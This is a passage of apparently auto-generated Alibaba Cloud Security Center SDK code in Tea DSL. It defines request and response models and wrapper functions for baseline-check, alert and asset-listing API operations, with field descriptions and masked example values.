  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckFixDetailsResponseBody(name='body'),
}

async function describeCheckFixDetailsWithOptions(request: DescribeCheckFixDetailsRequest, runtime: Util.RuntimeOptions): DescribeCheckFixDetailsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckFixDetails',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckFixDetails(request: DescribeCheckFixDetailsRequest): DescribeCheckFixDetailsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckFixDetailsWithOptions(request, runtime);
}

model DescribeCheckWarningDetailRequest {
  checkWarningId?: long(name='CheckWarningId', description='The ID of the alert that is triggered by the check item.

>  To query the details about a specified check item, you must provide the ID of the alert that is triggered by the check item. You can call the [DescribeCheckWarnings](~~DescribeCheckWarnings~~) operation to query the IDs of alerts.', example='98675301'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='103.25.XX.XX'),
}

model DescribeCheckWarningDetailResponseBody = {
  advice?: string(name='Advice', description='The suggestion for the management of the risk item.', example='You can fix it in the following ways:↵1. To configure authentication for redis service, click the redis.conf Configure complex password in requirepass, and then restart redis.↵2. In redis configuration file redis.conf The configuration is as follows: bind 127.0.0.1, only allow local access, and then restart redis'),
  checkId?: long(name='CheckId', description='The ID of the check item.', example='946'),
  description?: string(name='Description', description='The additional information about the risk item.', example='The redis port is open to the outside world and there is no authentication option configured. In addition to directly obtaining all the information in the database, unauthorized users can also attack the system through unauthorized access vulnerability.'),
  item?: string(name='Item', description='The name of the check item.', example='Redis unauthorized access'),
  level?: string(name='Level', description='The risk level of the check item. Valid values:

*   **high**: The item is a high-risk item and is highlighted in red.
*   **medium**: The item is a medium-risk item and is highlighted in orange.
*   **low**: The item is a low-risk item and is highlighted in gray.', example='high'),
  prompt?: string(name='Prompt', description='The prompt for the risk item.', example='weak passwords (username@host/password):root@****/12***'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  type?: string(name='Type', description='The type of the check item. Valid values:', example='Security audit'),
}

model DescribeCheckWarningDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningDetailResponseBody(name='body'),
}

async function describeCheckWarningDetailWithOptions(request: DescribeCheckWarningDetailRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkWarningId)) {
    query['CheckWarningId'] = request.checkWarningId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarningDetail(request: DescribeCheckWarningDetailRequest): DescribeCheckWarningDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningDetailWithOptions(request, runtime);
}

model DescribeCheckWarningMachinesRequest {
  checkId?: long(name='CheckId', example='58'),
  lang?: string(name='Lang', example='zh'),
  riskId?: long(name='RiskId', example='43'),
  status?: int32(name='Status', example='1'),
}

model DescribeCheckWarningMachinesResponseBody = {
  count?: int32(name='Count', example='10'),
  machines?: [ 
    {
      bind?: boolean(name='Bind', example='true'),
      instanceId?: string(name='InstanceId', example='i-bp1dp42hgn1xcq8l****'),
      instanceName?: string(name='InstanceName', example='win-oracl****'),
      internetIp?: string(name='InternetIp', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.25.XX.XX'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      uuid?: string(name='Uuid', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
    }
  ](name='Machines'),
  requestId?: string(name='RequestId', example='B3D989EB-2E59-584C-8438-5DFAA34A****'),
}

model DescribeCheckWarningMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningMachinesResponseBody(name='body'),
}

async function describeCheckWarningMachinesWithOptions(request: DescribeCheckWarningMachinesRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarningMachines(request: DescribeCheckWarningMachinesRequest): DescribeCheckWarningMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningMachinesWithOptions(request, runtime);
}

model DescribeCheckWarningSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c80dae73bd1be442699766b14ffd0****'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the container field. Valid values:

*   **clusterId**: the ID of the cluster
*   **image**: the name of the image
*   **imageId**: the ID of the image
*   **namespace**: the namespace', example='namespace'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the container field.', example='c819391d2d520485fa3e81e2dc2ea****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  groupId?: long(name='GroupId'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  riskName?: string(name='RiskName', description='The name of the risk item.', example='Redis'),
  riskStatus?: int32(name='RiskStatus', description='The status of the baseline check. Valid values:

*   **1**: failed
*   **3**: passed', example='1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='219.133.XX.XX'),
  status?: string(name='Status', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='1'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **uuid**: the ID of an asset', example='uuid'),
  typeName?: string(name='TypeName', description='The level-1 type of check items.

>  You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the level-1 types of check items.', example='database'),
  uuids?: string(name='Uuids', description='The UUID of the asset.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of assets.', example='f03259d8-1e81-4fae-bcbb-275fb5****'),
}

model DescribeCheckWarningSummaryResponseBody = {
  count?: int32(name='Count', description='The number of check items returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the current page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='00BD7CE2-284A-4534-BD09-FB69836DD750'),
  totalCount?: int32(name='TotalCount', description='The total number of check items.', example='100'),
  warningSummarys?: [ 
    {
      checkCount?: int32(name='CheckCount', description='The number of check items.', example='10'),
      checkExploit?: boolean(name='CheckExploit', description='Indicates whether the risk item can be exploited. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      databaseRisk?: boolean(name='DatabaseRisk', description='Indicates whether the risk item is a database risk item. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      highWarningCount?: int32(name='HighWarningCount', description='The number of high-risk items.', example='1'),
      lastFoundTime?: string(name='LastFoundTime', description='The time when the last baseline check was performed.', example='2019-01-01 12:23:00'),
      level?: string(name='Level', description='The risk level of the risk item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      lowWarningCount?: int32(name='LowWarningCount', description='The number of low-risk items.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', description='The number of medium-risk items.', example='2'),
      riskId?: long(name='RiskId', description='The ID of the risk item.', example='118'),
      riskName?: string(name='RiskName', description='The name of the risk item.', example='Redis'),
      subTypeAlias?: string(name='SubTypeAlias', description='The level-2 type of the risk item.', example='Redis'),
      typeAlias?: string(name='TypeAlias', description='The level-1 type of the check item. Examples: database, system, weak password, and middleware.', example='databases'),
      warningMachineCount?: int32(name='WarningMachineCount', description='The number of assets on which risk items are detected.', example='11'),
    }
  ](name='WarningSummarys', description='The statistics of check items.'),
}

model DescribeCheckWarningSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningSummaryResponseBody(name='body'),
}

async function describeCheckWarningSummaryWithOptions(request: DescribeCheckWarningSummaryRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarningSummary(request: DescribeCheckWarningSummaryRequest): DescribeCheckWarningSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningSummaryWithOptions(request, runtime);
}

model DescribeCheckWarningsRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.', example='2546'),
  checkType?: string(name='CheckType', description='The type of the check item. Valid values:

*   **hc.check.type.identity_auth**: identity authentication
*   **hc.check.type.access_control**: access control
*   **hc.check.type.network_service**: network and service
*   **hc.check.type.service_conf**: service configuration
*   **hc.check.type.file_rights**: file permission
*   **hc.check.type.security_audit**: security audit
*   **hc.check.type.attack_defense**: intrusion prevention
*   **hc.check.type.others**: others', example='hc.check.type.attack_defense'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  riskId?: long(name='RiskId', description='The ID of the risk item.

>  To query specified risk items and the check items of a specified server, you must provide the IDs of the risk items. You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of risk items.', example='10354'),
  riskStatus?: int32(name='RiskStatus', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.

>  To query specified risk items and the check items of a specified server, you must provide the ID of the server on which the baseline check is performed. You can call the [DescribeWarningMachines](~~DescribeWarningMachines~~) operation to query the IDs of servers.', example='d42f938c-d962-48a0-90f9-05****'),
}

model DescribeCheckWarningsResponseBody = {
  checkWarnings?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='2546'),
      checkWarningId?: long(name='CheckWarningId', description='The ID of the alert that is triggered by the check item.', example='212251441'),
      execErrorMessage?: string(name='ExecErrorMessage'),
      fixStatus?: int32(name='FixStatus', description='The fixing status of the check item. Valid values:

*   **0**: disabled
*   **1**: enabled', example='0'),
      item?: string(name='Item', description='The name of the check item.', example='passwordExpire'),
      level?: string(name='Level', description='The risk level of the risk item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      reason?: string(name='Reason', description='The remarks.', example='ignore'),
      status?: int32(name='Status', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1'),
      type?: string(name='Type', description='The type of the check item.', example='hc.check.type.identity_auth'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.', example='d42f938c-d962-48a0-90f9-****'),
    }
  ](name='CheckWarnings', description='An array that consists of the check items.'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0DFCADBA-7065-42DA-AF17-6868B9C2A8CF'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningsResponseBody(name='body'),
}

async function describeCheckWarningsWithOptions(request: DescribeCheckWarningsRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarnings(request: DescribeCheckWarningsRequest): DescribeCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningsWithOptions(request, runtime);
}

model DescribeClientConfSetupRequest {
  strategyTag?: string(name='StrategyTag', example='machineResource'),
  strategyTagValue?: string(name='StrategyTagValue', example='major'),
}

model DescribeClientConfSetupResponseBody = {
  clientConf?: {
    config?: string(name='Config', example='{"mem":"200","cpu":"10","cpu_all":"0"}'),
    strategyTag?: string(name='StrategyTag', example='machineResource'),
    strategyTagValue?: string(name='StrategyTagValue', example='major'),
  }(name='ClientConf'),
  requestId?: string(name='RequestId', example='151F6EB6-D5F3-417A-AF7B-4D84975D****'),
}

model DescribeClientConfSetupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClientConfSetupResponseBody(name='body'),
}

async function describeClientConfSetupWithOptions(request: DescribeClientConfSetupRequest, runtime: Util.RuntimeOptions): DescribeClientConfSetupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyTag)) {
    query['StrategyTag'] = request.strategyTag;
  }
  if (!Util.isUnset(request.strategyTagValue)) {
    query['StrategyTagValue'] = request.strategyTagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClientConfSetup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClientConfSetup(request: DescribeClientConfSetupRequest): DescribeClientConfSetupResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClientConfSetupWithOptions(request, runtime);
}

model DescribeClientConfStrategyRequest {
  tag?: string(name='Tag', example='machineResource'),
  tagValue?: string(name='TagValue', example='major'),
}

model DescribeClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId', example='5BD95679-D63A-4151-97D0-188432F****'),
  targetList?: [ 
    {
      uuid?: string(name='Uuid', example='2b1753a6-04d9-448e-ad17-7abdf19f****'),
    }
  ](name='TargetList'),
  totalCount?: int32(name='TotalCount', example='100'),
}

model DescribeClientConfStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClientConfStrategyResponseBody(name='body'),
}

async function describeClientConfStrategyWithOptions(request: DescribeClientConfStrategyRequest, runtime: Util.RuntimeOptions): DescribeClientConfStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.tagValue)) {
    query['TagValue'] = request.tagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClientConfStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClientConfStrategy(request: DescribeClientConfStrategyRequest): DescribeClientConfStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClientConfStrategyWithOptions(request, runtime);
}

model DescribeCloudCenterInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions that are used to filter assets. The value of this parameter is in the JSON format and is case-sensitive.

>  A search condition can be an instance ID, instance name, VPC ID, region, or public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"internetIp","value":"1.2.XX.XX"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  importance?: int32(name='Importance', description='The importance of the asset. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship among multiple search conditions. Valid values:

*   **OR**: The search conditions are evaluated by using a logical **OR**.
*   **AND**: The search conditions are evaluated by using a logical **AND**.', example='OR'),
  machineTypes?: string(name='MachineTypes', description='The type of the assets that you want to query. Valid values:

*   **ecs**: servers
*   **cloud_product**: Alibaba Cloud services', example='ecs'),
  noGroupTrace?: boolean(name='NoGroupTrace', description='Specifies whether to internationalize the name of the default group. Default value: **false** . Valid values:

*   **true**: The system returns the Chinese name of the default group for the GroupTrace response parameter.************
*   **false**: The system returns default for the GroupTrace response parameter.', example='false'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='100'),
  regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hangzhou'),
}

model DescribeCloudCenterInstancesResponseBody = {
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated on the asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **0**: an ECS instance
*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a NAT gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance
*   **5**: an ApsaraDB for Redis instance
*   **6**: a container image
*   **7**: a container', example='0'),
      authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to scan the asset.', example='1627974044000'),
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition', example='1'),
      authVersionName?: string(name='AuthVersionName', description='The name of the Security Center edition that is authorized to scan the asset. Valid values:

*   Basic edition
*   Anti-virus edition
*   Advanced edition
*   Enterprise edition
*   Ultimate edition
*   Value-added Plan edition', example='Ultimate Edition'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to scan the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent installed on the asset. Valid values:

*   **online**: The Security Center agent is **enabled**.
*   **offline**: The Security Center agent is **disabled**.
*   **pause**: The Security Center agent is **suspended**.', example='online'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c690a0789419f4284a4e0a29e12fe****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='cluster1'),
      cores?: int32(name='Cores', description='The number of the CPU cores used by the asset.', example='4'),
      cpuInfo?: string(name='CpuInfo', description='The CPU information about the asset.', example='Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz'),
      createdTime?: long(name='CreatedTime', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1607365213000'),
      exposedStatus?: int32(name='ExposedStatus', description='Indicates whether the asset is exposed. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      flag?: int32(name='Flag', description='Indicates whether the asset is an Alibaba Cloud asset. Valid values:

*   **0**: yes
*   **1**: no', example='0'),
      groupId?: long(name='GroupId', description='The ID of the asset group to which the asset belongs.', example='4120080'),
      groupTrace?: string(name='GroupTrace', description='The name of the group to which the asset belongs.', example='default'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risks are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
      healthCheckCount?: int32(name='HealthCheckCount', description='The number of baseline risks that are detected on the asset.', example='1'),
      importance?: int32(name='Importance', description='The importance of the asset. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='2'),
      instanceId?: string(name='InstanceId', description='The ID of the asset.', example='i-m5***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      ip?: string(name='Ip', description='The public IP address of the asset.', example='1.2.XX.XX'),
      ipListString?: string(name='IpListString', description='The IP addresses of the system.', example='172.31.XX.XX,172.171.XX.XX'),
      kernel?: string(name='Kernel', description='The version of the kernel.', example='3.10.0-1127.19.1.el7.x86_64'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp', description='The timestamp when the Security Center agent was last online. Unit: milliseconds.', example='1637592907000'),
      macListString?: string(name='MacListString', description='The MAC address of the system.', example='00:13:3e:31:13:39,02:12:67:b8:**:**'),
      mem?: int32(name='Mem', description='The size of the memory. Unit: MB.', example='1024'),
      os?: string(name='Os', description='The operating system of the asset.', example='Linux'),
      osName?: string(name='OsName', description='The kernel version of the asset.', example='-'),
      podCount?: int32(name='PodCount', description='The number of pods.', example='1'),
      region?: string(name='Region', description='The region ID of the asset.', example='cn-hangzhou-cm***-***'),
      regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hanghzou'),
      regionName?: string(name='RegionName', description='The name of the region in which the asset resides.', example='China (Hangzhou)'),
      riskCount?: string(name='RiskCount', description='The total number of baseline risks that are detected on the asset. The value of this parameter is in the JSON format and contains the following fields:

*   **account**: the number of accounts that are used to log on from unapproved logon locations and whose passwords are cracked
*   **appNum**: the number of scanners
*   **asapVulCount**: the total number of high-risk vulnerabilities
*   **baselineHigh**: the number of high-risk baseline risks
*   **baselineLow**: the number of low-risk baseline risks
*   **baselineMedium**: the number of medium-risk baseline risks
*   **baselineNum**: the total number of baseline risks
*   **cmsNum**: the number of Web-CMS vulnerabilities
*   **containerAsap**: the number of high-risk vulnerabilities that are detected on containers
*   **containerLater**: the number of medium-risk vulnerabilities that are detected on containers
*   **containerNntf**: the number of low-risk vulnerabilities that are detected on containers
*   **containerRemind**: the number of alerts whose Emergency level is Reminder on containers
*   **containerSerious**: the number of alerts whose Emergency level is Urgent on containers
*   **containerSuspicious**: the number of alerts whose Emergency level is Suspicious on containers
*   **cveNum**: the number of Linux software vulnerabilities
*   **emgNum**: the number of urgent vulnerabilities
*   **health**: the number of baseline alerts that are unhandled
*   **imageBaselineHigh**: the number of high-risk baseline risks that are detected on images
*   **imageBaselineLow**: the number of low-risk baseline risks that are detected on images
*   **imageBaselineMedium**: the number of medium-risk baseline risks that are detected on images
*   **imageBaselineNum**: the total number of baseline risks that are detected on images
*   **imageMaliciousFileRemind**: the number of malicious files that are detected on images and have the Emergency level of Reminder
*   **imageMaliciousFileSerious**: the number of malicious files that are detected on images and have the Emergency level of Urgent
*   **imageMaliciousFileSuspicious**: the number of malicious files that are detected on images and have the Emergency level of Suspicious
*   **imageVulAsap**: the number of high-risk vulnerabilities that are detected on images
*   **imageVulLater**: the number of medium-risk vulnerabilities that are detected on an image
*   **imageVulNntf**: the number of low-risk vulnerabilities that are detected on an image
*   **laterVulCount**: the number of medium-risk vulnerabilities
*   **newSuspicious**: the number of alerts
*   **nntfVulCount**: the number of low-risk vulnerabilities.
*   **remindNum**: the number of alerts whose Emergency level is Reminder
*   **scaNum**: the number of vulnerabilities that are detected based on software component analysis
*   **seriousNum**: the number of alerts whose Emergency level is Urgent
*   **suspNum**: the number of alerts whose Emergency level is Suspicious
*   **suspicious**: the total number of alerts
*   **sysNum**: the number of Windows system vulnerabilities
*   **trojan**: the number of trojans
*   **uuid**: the UUIDs of assets
*   **vul**: the number of vulnerabilities
*   **weakPWNum**: the number of weak passwords', example='{"account":0,"appNum":0,"asapVulCount":0,"baselineHigh":0,"baselineLow":0,"baselineMedium":0,"baselineNum":0,"cmsNum":0,"containerAsap":0,"containerLater":0,"containerNntf":0,"containerRemind":0,"containerSerious":0,"containerSuspicious":0,"cveNum":0,"emgNum":0,"health":0,"imageBaselineHigh":0,"imageBaselineLow":0,"imageBaselineMedium":0,"imageBaselineNum":0,"imageMaliciousFileRemind":0,"imageMaliciousFileSerious":0,"imageMaliciousFileSuspicious":0,"imageVulAsap":0,"imageVulLater":0,"imageVulNntf":0,"laterVulCount":0,"newSuspicious":0,"nntfVulCount":0,"remindNum":0,"scaNum":0,"seriousNum":0,"suspNum":0,"suspicious":0,"sysNum":0,"trojan":0,"uuid":"inet-37316411-37fe-4b72-b245-346a2721d4b6","vul":0,"weakPWNum":0}'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      safeEventCount?: int32(name='SafeEventCount', description='The number of alerts that are generated on the asset.', example='5'),
      status?: string(name='Status', description='The status of the asset. Valid values:

*   **Running**: running
*   **notRunning**: stopped', example='Running'),
      tag?: string(name='Tag', description='The name of the asset tag.', example='InternetIp,test'),
      tagId?: string(name='TagId', description='The ID of the asset tag.', example='121313,41412'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='c9107c04-942f-40c1-981a-f1c1***'),
      vendor?: int32(name='Vendor', description='The type of the asset by source. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
      vendorName?: string(name='VendorName', description='The name of the service provider (SP) for the asset.

Valid values:

*   **ALIYUN**: Alibaba Cloud
